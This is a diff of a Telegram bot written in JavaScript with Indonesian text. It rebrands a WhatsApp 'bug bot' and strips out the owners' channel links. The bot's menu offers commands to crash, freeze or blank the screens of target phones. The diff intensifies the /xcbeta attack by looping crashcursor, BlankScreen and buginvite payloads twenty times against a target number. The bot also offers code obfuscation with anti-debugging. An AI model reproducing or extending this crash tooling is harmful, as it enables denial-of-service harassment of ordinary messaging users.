@@ -371,16 +371,16 @@ const buttons = Markup.inlineKeyboard([
     Markup.button.callback('ℹ️ About', 'about'),
   ],
   // Baris terakhir: Tombol URL mengarah ke channel
-  [Markup.button.url('📢 Join Channel', 'https://t.me/allt3tibayzz')],
+  [Markup.button.url('📢 Join Channel', 'https://t.me/')],
 ]);
   await ctx.replyWithPhoto(getRandomPhoto(), {
     caption: `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ⎔━━━━━‐━━━━━‐━━━━━━━〆
 ❒ Silakan pilih menu di bawah ini ⬇️ :
 ⟣──────────
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
     `,
     parse_mode: 'Markdown',
     reply_markup: buttons.reply_markup,
@@ -424,21 +424,14 @@ const buttons = Markup.inlineKeyboard([
     Markup.button.callback('💥 BugMenu', 'option1'),
     Markup.button.callback('🍂 OwnerMenu', 'option2'),
   ],
-  // Baris kedua: RandomMenu dan About
-  [
-    Markup.button.callback('🌸 RandomMenu', 'randommenu'),
-    Markup.button.callback('ℹ️ About', 'about'),
-  ],
-  // Baris terakhir: Tombol URL mengarah ke channel
-  [Markup.button.url('📢 Join Channel', 'https://t.me/caywzzaja')],
 ]);
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ⎔━━━━━‐━━━━━‐━━━━━━━〆
 ❒ Silakan pilih menu di bawah ini ⬇️ :
 ⟣──────────
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
     `;
 
   await editMenu(ctx, caption, buttons);
@@ -458,21 +451,17 @@ bot.action('option1', async (ctx) => {
 
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ━━━━━━━━━━━━━━━━━━━━━
 ╭──(     \`ʙᴜɢᴍᴇɴᴜ\`     )
 │
 ㅒ
-│ /xcbeta ( Crash/ForClose )
-│ /xciosinvis ( Bug Call Ios )
-│ /xcandro ( Bug Campuran )
-│ /xciospay ( Bug Pay Ios )
-│ /xcsystemui ( Bug Crash Ui )
+│ /xcbeta ( Crash? idk )
 │ /delaymaker 1 hour ( Andro only )
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
   `;
 
   await editMenu(ctx, caption, buttons);
@@ -492,7 +481,7 @@ bot.action('option2', async (ctx) => {
 
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ━━━━━━━━━━━━━━━━━━━━━
 ╭──(     \`ᴏᴡɴᴇʀᴍᴇɴᴜ\`     )
 │
@@ -513,7 +502,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃�
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
   `;
 
   await editMenu(ctx, caption, buttons);
@@ -532,7 +521,7 @@ bot.action('randommenu', async (ctx) => {
 
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ━━━━━━━━━━━━━━━━━━━━━
 ╭──(     \`ꜱᴇᴀʀᴄʜᴍᴇɴᴜ\`     )
 │
@@ -546,7 +535,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃�
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
  
     `;
 
@@ -566,7 +555,7 @@ bot.action('downloadmenu', async (ctx) => {
 
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ━━━━━━━━━━━━━━━━━━━━━
 ╭──(     \`ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ\`     )
 │
@@ -578,7 +567,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃�
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
   `;
 
   await editMenu(ctx, caption, buttons);
@@ -596,7 +585,7 @@ bot.action('aimenu', async (ctx) => {
 
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ━━━━━━━━━━━━━━━━━━━━━
 ╭──(     \`ᴀɪᴍᴇɴᴜ\`     )
 │
@@ -609,7 +598,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃�
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
  
   `;
 
@@ -623,7 +612,7 @@ bot.action('javamenu', async (ctx) => {
 
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 ━━━━━━━━━━━━━━━━━━━━━
 ╭──(     \`ɴꜱꜰᴡᴍᴇɴᴜ\`     )
 │
@@ -635,20 +624,20 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃�
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
- © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
+ © RanzBOT.2
   `;
 
   await editMenu(ctx, caption, buttons);
 });
 // Action untuk About
-bot.action('about', async (ctx) => {
+bot.action('abbout', async (ctx) => {
   const buttons = Markup.inlineKeyboard([
     [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
   ]);
 
   const caption = `
 ${greeting}☁️
-Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
+Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
 - Penjelasan
 䒘 Script Ini Di Kembangkan Oleh
 䒘 #Caywzz ( @caywzz )
@@ -730,7 +719,7 @@ bot.command('statusprem', (ctx) => {
                 },
                 {
                     text: "☁️ Support Owner",
-                    url: "https://t.me/caywzzaja"
+                    url: "https://t.me/"
                 }
             ]
         ];
@@ -930,7 +919,7 @@ bot.command('listowner', async (ctx) => {
                 },
                 {
                     text: "☁️ Support Owner",
-                    url: "https://t.me/caywzzaja"
+                    url: "https://t.me/"
                 }
             ]
         ];
@@ -1221,7 +1210,7 @@ bot.command("enc", async (ctx) => {
     antiDebug: true,
   },
   identifierGenerator: function () {
-    return "caywzzaja" + Math.random().toString(36).substring(7);
+    return "ranzcoll" + Math.random().toString(36).substring(7);
   }
 });
     // Simpan hasil enkripsi
@@ -1351,7 +1340,7 @@ const prosesrespone = (target, ctx) => {
             },
             {
                 text: "☁️ Support Owner",
-                url: "https://t.me/bayzzivz"
+                url: "https://t.me/"
             }
         ]
     ];
@@ -1398,7 +1387,7 @@ const donerespone = (target, ctx) => {
             },
             {
                 text: "☁️ Support Owner",
-                url: "https://t.me/bayzzivz"
+                url: "https://t.me/"
             }
         ]
     ];
@@ -1479,7 +1468,10 @@ bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => 
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 1; i++) {
+  for (let i = 0; i < 20; i++) {
+        await crashcursor(target, { ptcp: true });
+        await BlankScreen(target, { ptcp: true });
+        await buginvite(target, { ptcp: true });
         await crashcursor(target, { ptcp: true });
   }
 
